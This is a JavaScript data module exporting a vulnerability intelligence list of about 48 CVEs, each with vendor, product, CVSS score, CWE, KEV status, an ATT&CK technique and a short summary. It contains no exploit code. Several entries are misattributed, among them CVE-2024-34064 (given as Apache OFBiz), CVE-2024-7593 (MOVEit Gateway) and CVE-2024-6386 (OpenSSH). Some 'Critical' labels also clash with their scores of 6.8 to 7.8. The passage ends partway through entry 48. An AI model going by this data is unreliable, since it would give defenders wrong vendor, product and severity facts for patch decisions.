// Auto-generated from CyberEDT_Vulnerability_Intelligence_Database.json
export const vulnerabilitiesData = [
  {
    "id": 1,
    "cve_id": "CVE-2023-22518",
    "vulnerability_name": "Atlassian Confluence Improper Authorization",
    "vendor": "Atlassian",
    "product": "Confluence Data Center",
    "severity": "Critical",
    "cvss_v3_score": 9.8,
    "cwe_id": "CWE-285",
    "vulnerability_type": "Improper Authorization",
    "known_exploited": "Yes",
    "kev_catalog": "Yes",
    "mitre_attack": [
      {
        "technique_id": "T1190",
        "technique_name": "Exploit Public-Facing Application"
      }
    ],
    "summary": "Improper authorization flaw allowing administrative privilege escalation and site compromise.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2023-22518"
    ]
  },
  {
    "id": 2,
    "cve_id": "CVE-2023-42793",
    "vulnerability_name": "JetBrains TeamCity Authentication Bypass",
    "vendor": "JetBrains",
    "product": "TeamCity",
    "severity": "Critical",
    "cvss_v3_score": 9.8,
    "cwe_id": "CWE-288",
    "vulnerability_type": "Authentication Bypass",
    "known_exploited": "Yes",
    "kev_catalog": "Yes",
    "mitre_attack": [
      {
        "technique_id": "T1190",
        "technique_name": "Exploit Public-Facing Application"
      }
    ],
    "summary": "Authentication bypass enabling administrative access and remote code execution.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2023-42793"
    ]
  },
  {
    "id": 3,
    "cve_id": "CVE-2023-46747",
    "vulnerability_name": "F5 BIG-IP TMUI RCE",
    "vendor": "F5",
    "product": "BIG-IP",
    "severity": "Critical",
    "cvss_v3_score": 9.8,
    "cwe_id": "CWE-78",
    "vulnerability_type": "Command Injection",
    "known_exploited": "Yes",
    "kev_catalog": "Yes",
    "mitre_attack": [
      {
        "technique_id": "T1190",
        "technique_name": "Exploit Public-Facing Application"
      }
    ],
    "summary": "Command injection in the Traffic Management User Interface.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2023-46747"
    ]
  },
  {
    "id": 4,
    "cve_id": "CVE-2022-22965",
    "vulnerability_name": "Spring4Shell",
    "vendor": "VMware",
    "product": "Spring Framework",
    "severity": "Critical",
    "cvss_v3_score": 9.8,
    "cwe_id": "CWE-94",
    "vulnerability_type": "Remote Code Execution",
    "known_exploited": "Yes",
    "kev_catalog": "Yes",
    "mitre_attack": [
      {
        "technique_id": "T1190",
        "technique_name": "Exploit Public-Facing Application"
      }
    ],
    "summary": "Data binding flaw leading to remote code execution under specific deployment conditions.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2022-22965"
    ]
  },
  {
    "id": 5,
    "cve_id": "CVE-2021-21972",
    "vulnerability_name": "VMware vCenter Server RCE",
    "vendor": "VMware",
    "product": "vCenter Server",
    "severity": "Critical",
    "cvss_v3_score": 9.8,
    "cwe_id": "CWE-434",
    "vulnerability_type": "Remote Code Execution",
    "known_exploited": "Yes",
    "kev_catalog": "Yes",
    "mitre_attack": [
      {
        "technique_id": "T1190",
        "technique_name": "Exploit Public-Facing Application"
      }
    ],
    "summary": "Unauthenticated file upload vulnerability enabling remote code execution.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2021-21972"
    ]
  },
  {
    "id": 6,
    "cve_id": "CVE-2023-20887",
    "vulnerability_name": "VMware Aria Operations RCE",
    "vendor": "VMware",
    "product": "Aria Operations",
    "severity": "Critical",
    "cvss_v3_score": 9.8,
    "cwe_id": "CWE-434",
    "vulnerability_type": "Remote Code Execution",
    "known_exploited": "Yes",
    "kev_catalog": "Yes",
    "mitre_attack": [
      {
        "technique_id": "T1190",
        "technique_name": "Exploit Public-Facing Application"
      }
    ],
    "summary": "Improper file upload enables unauthenticated remote code execution.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2023-20887"
    ]
  },
  {
    "id": 7,
    "cve_id": "CVE-2023-46604",
    "vulnerability_name": "Apache ActiveMQ RCE",
    "vendor": "Apache",
    "product": "ActiveMQ",
    "severity": "Critical",
    "cvss_v3_score": 10,
    "cwe_id": "CWE-502",
    "vulnerability_type": "Deserialization RCE",
    "known_exploited": "Yes",
    "kev_catalog": "Yes",
    "mitre_attack": [
      {
        "technique_id": "T1190",
        "technique_name": "Exploit Public-Facing Application"
      }
    ],
    "summary": "Deserialization flaw allowing remote code execution via crafted OpenWire messages.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2023-46604"
    ]
  },
  {
    "id": 8,
    "cve_id": "CVE-2021-41773",
    "vulnerability_name": "Apache HTTP Server Path Traversal",
    "vendor": "Apache",
    "product": "HTTP Server",
    "severity": "Critical",
    "cvss_v3_score": 7.5,
    "cwe_id": "CWE-22",
    "vulnerability_type": "Path Traversal",
    "known_exploited": "Yes",
    "kev_catalog": "Yes",
    "mitre_attack": [
      {
        "technique_id": "T1005",
        "technique_name": "Data from Local System"
      }
    ],
    "summary": "Path traversal that can lead to remote code execution in specific configurations.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2021-41773"
    ]
  },
  {
    "id": 9,
    "cve_id": "CVE-2021-42013",
    "vulnerability_name": "Apache HTTP Server RCE",
    "vendor": "Apache",
    "product": "HTTP Server",
    "severity": "Critical",
    "cvss_v3_score": 9.8,
    "cwe_id": "CWE-22",
    "vulnerability_type": "Remote Code Execution",
    "known_exploited": "Yes",
    "kev_catalog": "Yes",
    "mitre_attack": [
      {
        "technique_id": "T1190",
        "technique_name": "Exploit Public-Facing Application"
      }
    ],
    "summary": "Incomplete fix for CVE-2021-41773 allowing path traversal and RCE.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2021-42013"
    ]
  },
  {
    "id": 10,
    "cve_id": "CVE-2023-27350",
    "vulnerability_name": "PaperCut MF/NG RCE",
    "vendor": "PaperCut",
    "product": "PaperCut MF/NG",
    "severity": "Critical",
    "cvss_v3_score": 9.8,
    "cwe_id": "CWE-306",
    "vulnerability_type": "Authentication Bypass / RCE",
    "known_exploited": "Yes",
    "kev_catalog": "Yes",
    "mitre_attack": [
      {
        "technique_id": "T1190",
        "technique_name": "Exploit Public-Facing Application"
      }
    ],
    "summary": "Authentication bypass leading to remote code execution on exposed PaperCut servers.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2023-27350"
    ]
  },
  {
    "id": 11,
    "cve_id": "CVE-2023-27997",
    "vulnerability_name": "Fortinet FortiOS Heap Overflow",
    "vendor": "Fortinet",
    "product": "FortiOS / FortiProxy",
    "severity": "Critical",
    "cvss_v3_score": 9.2,
    "cwe_id": "CWE-122",
    "vulnerability_type": "Heap-Based Buffer Overflow",
    "known_exploited": "Yes",
    "kev_catalog": "Yes",
    "mitre_attack": [
      {
        "technique_id": "T1190",
        "technique_name": "Exploit Public-Facing Application"
      }
    ],
    "summary": "Specially crafted SSL-VPN requests can trigger heap corruption and remote code execution.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2023-27997"
    ]
  },
  {
    "id": 12,
    "cve_id": "CVE-2023-20273",
    "vulnerability_name": "Cisco IOS XE Web UI Privilege Escalation",
    "vendor": "Cisco",
    "product": "IOS XE",
    "severity": "Critical",
    "cvss_v3_score": 10,
    "cwe_id": "CWE-306",
    "vulnerability_type": "Authentication Bypass",
    "known_exploited": "Yes",
    "kev_catalog": "Yes",
    "mitre_attack": [
      {
        "technique_id": "T1190",
        "technique_name": "Exploit Public-Facing Application"
      }
    ],
    "summary": "Attackers can obtain privileged access through the exposed Web UI on vulnerable IOS XE devices.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2023-20273"
    ]
  },
  {
    "id": 13,
    "cve_id": "CVE-2020-14882",
    "vulnerability_name": "Oracle WebLogic Console RCE",
    "vendor": "Oracle",
    "product": "WebLogic Server",
    "severity": "Critical",
    "cvss_v3_score": 9.8,
    "cwe_id": "CWE-22",
    "vulnerability_type": "Remote Code Execution",
    "known_exploited": "Yes",
    "kev_catalog": "Yes",
    "mitre_attack": [
      {
        "technique_id": "T1190",
        "technique_name": "Exploit Public-Facing Application"
      }
    ],
    "summary": "Path traversal and console abuse enable unauthenticated remote code execution.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2020-14882"
    ]
  },
  {
    "id": 14,
    "cve_id": "CVE-2023-7028",
    "vulnerability_name": "GitLab Account Takeover",
    "vendor": "GitLab",
    "product": "GitLab CE/EE",
    "severity": "High",
    "cvss_v3_score": 8.8,
    "cwe_id": "CWE-640",
    "vulnerability_type": "Account Takeover",
    "known_exploited": "Yes",
    "kev_catalog": "Yes",
    "mitre_attack": [
      {
        "technique_id": "T1078",
        "technique_name": "Valid Accounts"
      }
    ],
    "summary": "Password reset flaw allows attackers to send reset emails to arbitrary addresses and hijack accounts.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2023-7028"
    ]
  },
  {
    "id": 15,
    "cve_id": "CVE-2023-35078",
    "vulnerability_name": "Ivanti Endpoint Manager Mobile Authentication Bypass",
    "vendor": "Ivanti",
    "product": "Endpoint Manager Mobile",
    "severity": "Critical",
    "cvss_v3_score": 10,
    "cwe_id": "CWE-288",
    "vulnerability_type": "Authentication Bypass",
    "known_exploited": "Yes",
    "kev_catalog": "Yes",
    "mitre_attack": [
      {
        "technique_id": "T1190",
        "technique_name": "Exploit Public-Facing Application"
      }
    ],
    "summary": "Unauthenticated attackers can access protected APIs and compromise exposed Ivanti EPMM servers.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2023-35078"
    ]
  },
  {
    "id": 16,
    "cve_id": "CVE-2024-27198",
    "vulnerability_name": "JetBrains TeamCity Authentication Bypass (Alternate Path)",
    "vendor": "JetBrains",
    "product": "TeamCity",
    "severity": "Critical",
    "cvss_v3_score": 9.8,
    "cwe_id": "CWE-288",
    "vulnerability_type": "Authentication Bypass",
    "known_exploited": "Yes",
    "kev_catalog": "Yes",
    "mitre_attack": [
      {
        "technique_id": "T1190",
        "technique_name": "Exploit Public-Facing Application"
      }
    ],
    "summary": "Authentication bypass allows administrative actions and remote code execution on vulnerable TeamCity servers.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-27198"
    ]
  },
  {
    "id": 17,
    "cve_id": "CVE-2023-50164",
    "vulnerability_name": "Apache Struts File Upload RCE",
    "vendor": "Apache",
    "product": "Struts 2",
    "severity": "Critical",
    "cvss_v3_score": 9.8,
    "cwe_id": "CWE-434",
    "vulnerability_type": "Remote Code Execution",
    "known_exploited": "Yes",
    "kev_catalog": "Yes",
    "mitre_attack": [
      {
        "technique_id": "T1190",
        "technique_name": "Exploit Public-Facing Application"
      }
    ],
    "summary": "Path traversal in file upload handling may lead to remote code execution.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2023-50164"
    ]
  },
  {
    "id": 18,
    "cve_id": "CVE-2023-42789",
    "vulnerability_name": "FortiManager fgfmd RCE",
    "vendor": "Fortinet",
    "product": "FortiManager",
    "severity": "Critical",
    "cvss_v3_score": 9.3,
    "cwe_id": "CWE-787",
    "vulnerability_type": "Remote Code Execution",
    "known_exploited": "Yes",
    "kev_catalog": "Yes",
    "mitre_attack": [
      {
        "technique_id": "T1210",
        "technique_name": "Exploitation of Remote Services"
      }
    ],
    "summary": "Heap corruption in fgfmd may allow unauthenticated remote code execution.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2023-42789"
    ]
  },
  {
    "id": 19,
    "cve_id": "CVE-2023-4911",
    "vulnerability_name": "Looney Tunables",
    "vendor": "GNU",
    "product": "glibc",
    "severity": "Critical",
    "cvss_v3_score": 7.8,
    "cwe_id": "CWE-122",
    "vulnerability_type": "Local Privilege Escalation",
    "known_exploited": "Yes",
    "kev_catalog": "No",
    "mitre_attack": [
      {
        "technique_id": "T1068",
        "technique_name": "Exploitation for Privilege Escalation"
      }
    ],
    "summary": "Buffer overflow in glibc dynamic loader enables local privilege escalation.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2023-4911"
    ]
  },
  {
    "id": 20,
    "cve_id": "CVE-2024-3094",
    "vulnerability_name": "XZ Utils Backdoor",
    "vendor": "XZ Utils",
    "product": "liblzma",
    "severity": "Critical",
    "cvss_v3_score": 10,
    "cwe_id": "CWE-506",
    "vulnerability_type": "Backdoored Software Supply Chain",
    "known_exploited": "No",
    "kev_catalog": "No",
    "mitre_attack": [
      {
        "technique_id": "T1195.002",
        "technique_name": "Supply Chain Compromise: Compromise Software Supply Chain"
      }
    ],
    "summary": "Malicious code inserted into release tarballs could enable SSH authentication bypass on affected systems.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-3094"
    ]
  },
  {
    "id": 21,
    "cve_id": "CVE-2024-3400",
    "vulnerability_name": "Palo Alto PAN-OS GlobalProtect Command Injection",
    "vendor": "Palo Alto Networks",
    "product": "PAN-OS",
    "severity": "Critical",
    "cvss_v3_score": 10,
    "cwe_id": "CWE-77",
    "vulnerability_type": "Command Injection",
    "known_exploited": "Yes",
    "kev_catalog": "Yes",
    "mitre_attack": [
      {
        "technique_id": "T1190",
        "technique_name": "Exploit Public-Facing Application"
      }
    ],
    "summary": "Unauthenticated command injection in the GlobalProtect gateway can lead to remote code execution.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-3400"
    ]
  },
  {
    "id": 22,
    "cve_id": "CVE-2024-1709",
    "vulnerability_name": "ConnectWise ScreenConnect Authentication Bypass",
    "vendor": "ConnectWise",
    "product": "ScreenConnect",
    "severity": "Critical",
    "cvss_v3_score": 10,
    "cwe_id": "CWE-288",
    "vulnerability_type": "Authentication Bypass",
    "known_exploited": "Yes",
    "kev_catalog": "Yes",
    "mitre_attack": [
      {
        "technique_id": "T1190",
        "technique_name": "Exploit Public-Facing Application"
      }
    ],
    "summary": "Authentication bypass and path traversal enabling administrative access and remote code execution.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-1709"
    ]
  },
  {
    "id": 23,
    "cve_id": "CVE-2024-23897",
    "vulnerability_name": "Jenkins CLI Arbitrary File Read",
    "vendor": "Jenkins",
    "product": "Jenkins",
    "severity": "Critical",
    "cvss_v3_score": 9.8,
    "cwe_id": "CWE-552",
    "vulnerability_type": "Arbitrary File Read",
    "known_exploited": "Yes",
    "kev_catalog": "Yes",
    "mitre_attack": [
      {
        "technique_id": "T1005",
        "technique_name": "Data from Local System"
      }
    ],
    "summary": "Improper command parser allows attackers to read sensitive files and facilitate further compromise.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-23897"
    ]
  },
  {
    "id": 24,
    "cve_id": "CVE-2024-21762",
    "vulnerability_name": "Fortinet FortiOS SSL VPN Out-of-Bounds Write",
    "vendor": "Fortinet",
    "product": "FortiOS",
    "severity": "Critical",
    "cvss_v3_score": 9.6,
    "cwe_id": "CWE-787",
    "vulnerability_type": "Out-of-Bounds Write",
    "known_exploited": "Yes",
    "kev_catalog": "Yes",
    "mitre_attack": [
      {
        "technique_id": "T1190",
        "technique_name": "Exploit Public-Facing Application"
      }
    ],
    "summary": "Out-of-bounds write in SSL VPN may permit remote code execution on vulnerable appliances.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-21762"
    ]
  },
  {
    "id": 25,
    "cve_id": "CVE-2024-6387",
    "vulnerability_name": "OpenSSH regreSSHion",
    "vendor": "OpenSSH",
    "product": "OpenSSH",
    "severity": "Critical",
    "cvss_v3_score": 8.1,
    "cwe_id": "CWE-364",
    "vulnerability_type": "Race Condition",
    "known_exploited": "No",
    "kev_catalog": "No",
    "mitre_attack": [
      {
        "technique_id": "T1210",
        "technique_name": "Exploitation of Remote Services"
      }
    ],
    "summary": "Signal handler race condition may allow unauthenticated remote code execution on affected OpenSSH servers.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-6387"
    ]
  },
  {
    "id": 26,
    "cve_id": "CVE-2024-4577",
    "vulnerability_name": "PHP CGI Argument Injection",
    "vendor": "PHP",
    "product": "PHP-CGI",
    "severity": "Critical",
    "cvss_v3_score": 9.8,
    "cwe_id": "CWE-88",
    "vulnerability_type": "Argument Injection / RCE",
    "known_exploited": "Yes",
    "kev_catalog": "Yes",
    "mitre_attack": [
      {
        "technique_id": "T1190",
        "technique_name": "Exploit Public-Facing Application"
      }
    ],
    "summary": "Improper argument handling in PHP-CGI enables remote code execution on affected Windows deployments.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-4577"
    ]
  },
  {
    "id": 27,
    "cve_id": "CVE-2024-21893",
    "vulnerability_name": "Ivanti Connect Secure Server-Side Request Forgery",
    "vendor": "Ivanti",
    "product": "Connect Secure",
    "severity": "Critical",
    "cvss_v3_score": 8.2,
    "cwe_id": "CWE-918",
    "vulnerability_type": "SSRF",
    "known_exploited": "Yes",
    "kev_catalog": "Yes",
    "mitre_attack": [
      {
        "technique_id": "T1190",
        "technique_name": "Exploit Public-Facing Application"
      }
    ],
    "summary": "Server-side request forgery that can be chained with other flaws for appliance compromise.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-21893"
    ]
  },
  {
    "id": 28,
    "cve_id": "CVE-2024-21887",
    "vulnerability_name": "Ivanti Connect Secure Command Injection",
    "vendor": "Ivanti",
    "product": "Connect Secure",
    "severity": "Critical",
    "cvss_v3_score": 9.1,
    "cwe_id": "CWE-77",
    "vulnerability_type": "Command Injection",
    "known_exploited": "Yes",
    "kev_catalog": "Yes",
    "mitre_attack": [
      {
        "technique_id": "T1190",
        "technique_name": "Exploit Public-Facing Application"
      }
    ],
    "summary": "Command injection vulnerability enabling remote code execution on vulnerable gateways.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-21887"
    ]
  },
  {
    "id": 29,
    "cve_id": "CVE-2024-27199",
    "vulnerability_name": "JetBrains TeamCity Path Traversal",
    "vendor": "JetBrains",
    "product": "TeamCity",
    "severity": "High",
    "cvss_v3_score": 7.3,
    "cwe_id": "CWE-22",
    "vulnerability_type": "Path Traversal",
    "known_exploited": "Yes",
    "kev_catalog": "No",
    "mitre_attack": [
      {
        "technique_id": "T1005",
        "technique_name": "Data from Local System"
      }
    ],
    "summary": "Path traversal vulnerability related to the TeamCity authentication bypass chain.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-27199"
    ]
  },
  {
    "id": 30,
    "cve_id": "CVE-2023-46805",
    "vulnerability_name": "Ivanti Connect Secure Authentication Bypass",
    "vendor": "Ivanti",
    "product": "Connect Secure",
    "severity": "Critical",
    "cvss_v3_score": 8.2,
    "cwe_id": "CWE-288",
    "vulnerability_type": "Authentication Bypass",
    "known_exploited": "Yes",
    "kev_catalog": "Yes",
    "mitre_attack": [
      {
        "technique_id": "T1190",
        "technique_name": "Exploit Public-Facing Application"
      }
    ],
    "summary": "Authentication bypass that was widely chained with command injection for mass exploitation.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2023-46805"
    ]
  },
  {
    "id": 31,
    "cve_id": "CVE-2024-24919",
    "vulnerability_name": "Check Point Security Gateway Information Disclosure",
    "vendor": "Check Point",
    "product": "Security Gateway",
    "severity": "High",
    "cvss_v3_score": 8.6,
    "cwe_id": "CWE-200",
    "vulnerability_type": "Information Disclosure",
    "known_exploited": "Yes",
    "kev_catalog": "Yes",
    "mitre_attack": [
      {
        "technique_id": "T1005",
        "technique_name": "Data from Local System"
      }
    ],
    "summary": "Attackers can read sensitive information from Internet-exposed VPN gateways.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-24919"
    ]
  },
  {
    "id": 32,
    "cve_id": "CVE-2023-3519",
    "vulnerability_name": "Citrix ADC/Gateway RCE",
    "vendor": "Citrix",
    "product": "ADC and Gateway",
    "severity": "Critical",
    "cvss_v3_score": 9.8,
    "cwe_id": "CWE-94",
    "vulnerability_type": "Remote Code Execution",
    "known_exploited": "Yes",
    "kev_catalog": "Yes",
    "mitre_attack": [
      {
        "technique_id": "T1190",
        "technique_name": "Exploit Public-Facing Application"
      }
    ],
    "summary": "Memory corruption enabling unauthenticated remote code execution.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2023-3519"
    ]
  },
  {
    "id": 33,
    "cve_id": "CVE-2024-1086",
    "vulnerability_name": "Linux Kernel nf_tables Privilege Escalation",
    "vendor": "Linux",
    "product": "Kernel",
    "severity": "High",
    "cvss_v3_score": 7.8,
    "cwe_id": "CWE-416",
    "vulnerability_type": "Use-After-Free",
    "known_exploited": "Yes",
    "kev_catalog": "Yes",
    "mitre_attack": [
      {
        "technique_id": "T1068",
        "technique_name": "Exploitation for Privilege Escalation"
      }
    ],
    "summary": "Use-after-free in nf_tables allows local privilege escalation.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-1086"
    ]
  },
  {
    "id": 34,
    "cve_id": "CVE-2023-4966",
    "vulnerability_name": "CitrixBleed Session Token Disclosure",
    "vendor": "Citrix",
    "product": "NetScaler ADC/Gateway",
    "severity": "Critical",
    "cvss_v3_score": 9.4,
    "cwe_id": "CWE-125",
    "vulnerability_type": "Out-of-Bounds Read",
    "known_exploited": "Yes",
    "kev_catalog": "Yes",
    "mitre_attack": [
      {
        "technique_id": "T1539",
        "technique_name": "Steal Web Session Cookie"
      }
    ],
    "summary": "Out-of-bounds read exposes session tokens for VPN users.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2023-4966"
    ]
  },
  {
    "id": 35,
    "cve_id": "CVE-2024-37085",
    "vulnerability_name": "VMware ESXi Authentication Bypass",
    "vendor": "VMware",
    "product": "ESXi",
    "severity": "Critical",
    "cvss_v3_score": 6.8,
    "cwe_id": "CWE-284",
    "vulnerability_type": "Authentication Bypass",
    "known_exploited": "Yes",
    "kev_catalog": "Yes",
    "mitre_attack": [
      {
        "technique_id": "T1078",
        "technique_name": "Valid Accounts"
      }
    ],
    "summary": "Authentication bypass affecting domain-joined ESXi hosts, abused by ransomware operators.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-37085"
    ]
  },
  {
    "id": 36,
    "cve_id": "CVE-2024-30051",
    "vulnerability_name": "Windows DWM Core Library Elevation of Privilege",
    "vendor": "Microsoft",
    "product": "Windows Desktop Window Manager",
    "severity": "Critical",
    "cvss_v3_score": 7.8,
    "cwe_id": "CWE-416",
    "vulnerability_type": "Elevation of Privilege",
    "known_exploited": "Yes",
    "kev_catalog": "Yes",
    "mitre_attack": [
      {
        "technique_id": "T1068",
        "technique_name": "Exploitation for Privilege Escalation"
      }
    ],
    "summary": "Use-after-free vulnerability allowing local SYSTEM privilege escalation.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-30051"
    ]
  },
  {
    "id": 37,
    "cve_id": "CVE-2024-30040",
    "vulnerability_name": "Microsoft Message Queuing Remote Code Execution",
    "vendor": "Microsoft",
    "product": "Microsoft Message Queuing",
    "severity": "Critical",
    "cvss_v3_score": 9.8,
    "cwe_id": "CWE-787",
    "vulnerability_type": "Remote Code Execution",
    "known_exploited": "No",
    "kev_catalog": "No",
    "mitre_attack": [
      {
        "technique_id": "T1210",
        "technique_name": "Exploitation of Remote Services"
      }
    ],
    "summary": "Heap-based buffer overflow in MSMQ may allow unauthenticated remote code execution.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-30040"
    ]
  },
  {
    "id": 38,
    "cve_id": "CVE-2024-38063",
    "vulnerability_name": "Windows TCP/IP Remote Code Execution",
    "vendor": "Microsoft",
    "product": "Windows TCP/IP",
    "severity": "Critical",
    "cvss_v3_score": 9.8,
    "cwe_id": "CWE-787",
    "vulnerability_type": "Remote Code Execution",
    "known_exploited": "No",
    "kev_catalog": "No",
    "mitre_attack": [
      {
        "technique_id": "T1210",
        "technique_name": "Exploitation of Remote Services"
      }
    ],
    "summary": "Integer underflow in Windows TCP/IP stack enabling remote code execution through crafted IPv6 packets.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-38063"
    ]
  },
  {
    "id": 39,
    "cve_id": "CVE-2024-21413",
    "vulnerability_name": "Microsoft Outlook Moniker Link Security Feature Bypass",
    "vendor": "Microsoft",
    "product": "Outlook",
    "severity": "High",
    "cvss_v3_score": 9.8,
    "cwe_id": "CWE-610",
    "vulnerability_type": "Security Feature Bypass",
    "known_exploited": "Yes",
    "kev_catalog": "Yes",
    "mitre_attack": [
      {
        "technique_id": "T1566.001",
        "technique_name": "Spearphishing Attachment"
      }
    ],
    "summary": "Specially crafted links can bypass Protected View and facilitate code execution.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-21413"
    ]
  },
  {
    "id": 40,
    "cve_id": "CVE-2024-34064",
    "vulnerability_name": "Apache OFBiz Authentication Bypass",
    "vendor": "Apache",
    "product": "OFBiz",
    "severity": "Critical",
    "cvss_v3_score": 9.8,
    "cwe_id": "CWE-288",
    "vulnerability_type": "Authentication Bypass",
    "known_exploited": "Yes",
    "kev_catalog": "Yes",
    "mitre_attack": [
      {
        "technique_id": "T1190",
        "technique_name": "Exploit Public-Facing Application"
      }
    ],
    "summary": "Authentication bypass enabling unauthenticated code execution on vulnerable OFBiz installations.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-34064"
    ]
  },
  {
    "id": 41,
    "cve_id": "CVE-2024-40711",
    "vulnerability_name": "Veeam Backup & Replication RCE",
    "vendor": "Veeam",
    "product": "Backup & Replication",
    "severity": "Critical",
    "cvss_v3_score": 9.8,
    "cwe_id": "CWE-502",
    "vulnerability_type": "Remote Code Execution",
    "known_exploited": "Yes",
    "kev_catalog": "Yes",
    "mitre_attack": [
      {
        "technique_id": "T1190",
        "technique_name": "Exploit Public-Facing Application"
      }
    ],
    "summary": "Deserialization vulnerability allowing remote code execution on backup servers.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-40711"
    ]
  },
  {
    "id": 42,
    "cve_id": "CVE-2024-6386",
    "vulnerability_name": "OpenSSH VerifyHostKeyDNS Logic Flaw",
    "vendor": "OpenSSH",
    "product": "OpenSSH",
    "severity": "High",
    "cvss_v3_score": 7.5,
    "cwe_id": "CWE-670",
    "vulnerability_type": "Improper Logic",
    "known_exploited": "No",
    "kev_catalog": "No",
    "mitre_attack": [
      {
        "technique_id": "T1557",
        "technique_name": "Adversary-in-the-Middle"
      }
    ],
    "summary": "Logic flaw affecting host key verification under specific configurations.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-6386"
    ]
  },
  {
    "id": 43,
    "cve_id": "CVE-2024-55591",
    "vulnerability_name": "FortiOS Authentication Bypass",
    "vendor": "Fortinet",
    "product": "FortiOS",
    "severity": "Critical",
    "cvss_v3_score": 9.6,
    "cwe_id": "CWE-288",
    "vulnerability_type": "Authentication Bypass",
    "known_exploited": "Yes",
    "kev_catalog": "No",
    "mitre_attack": [
      {
        "technique_id": "T1190",
        "technique_name": "Exploit Public-Facing Application"
      }
    ],
    "summary": "Authentication bypass affecting exposed FortiOS management interfaces.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-55591"
    ]
  },
  {
    "id": 44,
    "cve_id": "CVE-2024-47575",
    "vulnerability_name": "FortiManager Missing Authentication",
    "vendor": "Fortinet",
    "product": "FortiManager",
    "severity": "Critical",
    "cvss_v3_score": 9.8,
    "cwe_id": "CWE-306",
    "vulnerability_type": "Missing Authentication",
    "known_exploited": "Yes",
    "kev_catalog": "Yes",
    "mitre_attack": [
      {
        "technique_id": "T1190",
        "technique_name": "Exploit Public-Facing Application"
      }
    ],
    "summary": "Missing authentication vulnerability enabling remote administrative compromise.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-47575"
    ]
  },
  {
    "id": 45,
    "cve_id": "CVE-2024-7593",
    "vulnerability_name": "Progress MOVEit Gateway SQL Injection",
    "vendor": "Progress",
    "product": "MOVEit Gateway",
    "severity": "Critical",
    "cvss_v3_score": 9.8,
    "cwe_id": "CWE-89",
    "vulnerability_type": "SQL Injection",
    "known_exploited": "No",
    "kev_catalog": "No",
    "mitre_attack": [
      {
        "technique_id": "T1190",
        "technique_name": "Exploit Public-Facing Application"
      }
    ],
    "summary": "SQL injection vulnerability affecting MOVEit Gateway deployments.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-7593"
    ]
  },
  {
    "id": 46,
    "cve_id": "CVE-2024-51567",
    "vulnerability_name": "CyberPanel Authentication Bypass",
    "vendor": "CyberPanel",
    "product": "CyberPanel",
    "severity": "Critical",
    "cvss_v3_score": 9.8,
    "cwe_id": "CWE-288",
    "vulnerability_type": "Authentication Bypass",
    "known_exploited": "Yes",
    "kev_catalog": "No",
    "mitre_attack": [
      {
        "technique_id": "T1190",
        "technique_name": "Exploit Public-Facing Application"
      }
    ],
    "summary": "Authentication bypass enabling administrative compromise of exposed CyberPanel instances.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-51567"
    ]
  },
  {
    "id": 47,
    "cve_id": "CVE-2024-38856",
    "vulnerability_name": "Apache OFBiz Pre-Auth RCE",
    "vendor": "Apache",
    "product": "OFBiz",
    "severity": "Critical",
    "cvss_v3_score": 9.8,
    "cwe_id": "CWE-94",
    "vulnerability_type": "Remote Code Execution",
    "known_exploited": "Yes",
    "kev_catalog": "No",
    "mitre_attack": [
      {
        "technique_id": "T1190",
        "technique_name": "Exploit Public-Facing Application"
      }
    ],
    "summary": "Pre-authentication remote code execution affecting vulnerable Apache OFBiz deployments.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-38856"
    ]
  },
  {
    "id": 48,
    "cve_id": "CVE-2024-0012",
    "vulnerability_name": "Palo Alto PAN-OS Management Interface Authentication Bypass",
    "vendor": "Palo Alto Networks",
    "product": "PAN-OS",
    "severity": "Critical",
    "cvss_v3_score": 9.3,
